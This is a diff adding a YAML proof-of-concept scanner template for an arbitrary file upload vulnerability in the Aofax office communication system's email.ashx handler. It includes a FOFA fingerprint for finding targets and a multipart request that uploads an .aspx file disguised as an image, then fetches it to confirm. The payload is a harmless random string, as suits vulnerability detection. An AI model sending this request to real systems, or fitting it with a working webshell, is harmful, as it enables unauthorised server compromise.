@@ -1,0 +1,31 @@
+id: poc-yaml-aofax-email-ashx-anyfile-upload
+info:
+  name: 傲发办公通信专家系统 email.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 傲发办公通信专家系统
+  fofa: body="getincommingcall"
+variables:
+  t1: random_str(6)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /handle/email.ashx?action=updatefiles&logname=stc
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,"oldfileName")
+- method: GET
+  path: /upFiles/email/temp/stc/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
